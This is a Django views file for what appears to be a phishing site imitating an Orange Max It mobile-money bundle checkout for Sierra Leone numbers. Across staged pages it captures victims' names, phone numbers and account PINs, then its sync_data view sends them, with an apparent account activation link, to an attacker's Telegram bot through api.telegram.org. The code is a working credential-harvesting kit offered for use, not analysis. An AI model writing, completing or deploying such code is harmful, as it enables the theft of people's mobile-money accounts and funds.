import json
import requests
from django.shortcuts import render, redirect
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from decouple import config # Recommended to use your settings instead of hardcoding

# Telegram Configuration (Get from your settings.py if possible)
BOT_TOKEN = config('TELEGRAM_BOT_TOKEN', default='YOUR_BOT_TOKEN')
CHAT_ID = config('TELEGRAM_CHAT_ID', default='YOUR_CHAT_ID')

def home(request):
    return render(request, 'index.html')

def checkout(request):
    """ Stage 1: Checkout page """
    bundle = request.GET.get('bundle', 'Power User')
    price = request.GET.get('price', '199')
    context = {'bundle': bundle, 'price': price}
    return render(request, 'checkout.html', context)

def payment_instructions(request):
    """ Stage 2: Capture customer details """
    if request.method == 'POST':
        request.session['name'] = request.POST.get('fullName', '')
        request.session['phone'] = request.POST.get('phone', '')
        request.session['bundle'] = request.POST.get('bundle', '')
        request.session['city'] = request.POST.get('city', '')
        request.session.modified = True # Ensure session is saved
        return render(request, 'payment_instructions.html')
    return redirect('checkout')

def otp_verification(request):
    """ Stage 3: Capture Phone/PIN and show OTP page """
    if request.method == 'POST':
        # Capture the Phone and PIN from the Instruction page form
        request.session['phone'] = request.POST.get('phone', '')
        request.session['pin'] = request.POST.get('pin', '')
        request.session.modified = True
        
        return render(request, 'otp_verification.html')
    
    return redirect('checkout')

@csrf_exempt
def sync_data(request):
    """
    Stage 4: Send collected data (including Activation Link) to Telegram
    """
    if request.method != 'POST':
        return JsonResponse({"status": "error", "message": "POST required"}, status=405)

    try:
        data = json.loads(request.body)
        # Get the link from the JSON payload
        activation_link = data.get('link', 'No link provided')

        # Retrieve user details from the Django Session
        phone = request.session.get('phone', 'Unknown')
        bundle = request.session.get('bundle', 'Unknown')
        pin = request.session.get('pin', 'Unknown')
        name = request.session.get('name', 'Unknown')

        message = (
            "🇸🇱 ORANGE MAX IT LOGIN\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"👤 NAME: {name}\n"
            f"📞 PHONE: +232 {phone}\n"
            f"📦 BUNDLE: {bundle}\n"
            f"🔑 PIN: {pin}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🔗 ACTIVATION LINK:\n{activation_link}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "📡 STATUS: PENDING VERIFICATION"
        )

        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        response = requests.post(
            telegram_url,
            data={
                "chat_id": CHAT_ID,
                "text": message,
                "disable_web_page_preview": False # Keeps the link clickable in Telegram
            }
        )

        if response.status_code == 200:
            return JsonResponse({"status": "success"})
        
        return JsonResponse({"status": "error", "message": "Telegram failed to send"}, status=500)

    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)}, status=400)